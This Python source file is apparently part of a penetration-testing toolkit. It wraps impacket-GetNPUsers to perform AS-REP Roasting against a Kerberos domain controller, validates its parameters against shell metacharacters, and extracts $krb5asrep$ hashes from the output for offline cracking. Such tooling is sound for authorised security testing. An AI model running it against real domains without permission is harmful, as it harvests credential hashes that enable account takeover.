"""ImpacketGetNPUsersTool — AS-REP Roasting — find accounts without Kerberos pre-auth."""
import re
from typing import Any

from astro.core.validators import SHELL_METACHARACTERS, validate_additional_args, validate_path
from astro.tools.base import BaseTool

_HASHES_RE = re.compile(r'^[0-9a-fA-F:]+$')
_ASREP_HASH_RE = re.compile(r'(\$krb5asrep\$[^\s]+)', re.MULTILINE)


class ImpacketGetNPUsersTool(BaseTool):
    name = "impacket-asreproast"
    description = "AS-REP Roasting — find accounts without Kerberos pre-auth"

    def validate(self, params: dict[str, Any]) -> dict[str, Any]:
        target = params.get("target", "")
        if not target:
            raise ValueError("Target parameter is required")
        if not all(c.isalnum() or c in ".-_:" for c in target):
            raise ValueError("Invalid target parameter")

        domain = params.get("domain", "")
        if not domain:
            raise ValueError("Domain parameter is required")
        if not all(c.isalnum() or c in ".-" for c in domain):
            raise ValueError("Invalid domain parameter")

        usersfile = params.get("usersfile", "")
        if usersfile and not validate_path(usersfile):
            raise ValueError("Invalid usersfile parameter: must be an absolute path with safe characters")

        username = params.get("username", "")
        if username and SHELL_METACHARACTERS.search(username):
            raise ValueError("Invalid username parameter")

        password = params.get("password", "")
        if password and SHELL_METACHARACTERS.search(password):
            raise ValueError("Invalid password parameter")

        if not usersfile and not username:
            raise ValueError("Either usersfile or username is required")

        additional_args = params.get("additional_args", "")
        tokens: list[str] = []
        if additional_args:
            tokens = validate_additional_args(additional_args)

        return {
            "target": target,
            "domain": domain,
            "usersfile": usersfile,
            "username": username,
            "password": password,
            "tokens": tokens,
        }

    def build_command(self, params: dict[str, Any]) -> list[str]:
        if params["usersfile"]:
            cmd = [
                "impacket-GetNPUsers", f"{params['domain']}/",
                "-dc-ip", params["target"],
                "-no-pass",
                "-usersfile", params["usersfile"],
            ]
        else:
            cmd = [
                "impacket-GetNPUsers",
                f"{params['domain']}/{params['username']}:{params['password']}",
                "-dc-ip", params["target"],
                "-request",
            ]
        cmd.extend(params["tokens"])
        return cmd

    def parse_output(self, raw: dict[str, Any], params: dict[str, Any]) -> dict[str, Any]:
        stdout = raw.get("stdout", "")
        hashes = _ASREP_HASH_RE.findall(stdout)
        return {"hashes": hashes, "count": len(hashes)}
